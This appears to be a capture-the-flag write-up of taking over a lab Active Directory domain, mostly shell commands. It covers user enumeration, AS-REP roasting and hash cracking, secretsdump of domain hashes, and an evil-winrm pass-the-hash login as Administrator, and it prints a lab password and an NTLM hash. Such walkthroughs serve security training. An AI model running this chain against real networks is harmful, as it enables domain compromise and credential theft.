Install impacket:
```
sudo su; apt-get update && apt-get upgrade;git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```
To install the Python requirements for Impacket:
```
pip3 install -r /opt/impacket/requirements.txt
```
Once the requirements have finished installing, we can then run the python setup install script:
```
cd /opt/impacket/ && python3 ./setup.py install
```
Install bloodhound and neo4j
```
apt install bloodhound neo4j
```
We use nmap and enum4linux to enumerate the machine.
```
nmap -sV -sC -Pn -T5 10.10.62.43
```
```
enum4linux 10.10.62.43
```
Since the port for kerberos was opened we were able to use kerbrute for user enumeration.

```
./kerbrute userenum --dc 10.10.62.43 -d spookysec.local userlist.txt
```
We then used the command: 
```
python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.62.43
```
On the svc-admin user to get a hash. We then decrypted the hash with john ro get the password for the user.
```
john admin.hash --wordlist=/home/blackzero/rockyou.txt 
```
we also used hashcat:
```
hashcat -m 18200 admin.hash passwordlist.txt
```
With the password we attained we then logged into the smbclient and found a file with a base64 encoded message
```
smbclient -L <target ip> -U svc-admin
```
```
smbclient \\\\<target ip>\\backup -U svc-admin
```
we decoded the hash with Cyberchef 
and got the credentials for the user backup.

afterwards we used secretsdump.py to dump the hashes for the users and attained the administrators hash
```
python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.62.43
```
Then we logged in as the administrator with the hash using evil-wnrm.
```
evil-winrm -i 10.10.62.43 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
We are now logged in as the Administrator with administrator priveldges and have fully compromised the directory; action is no longer required.
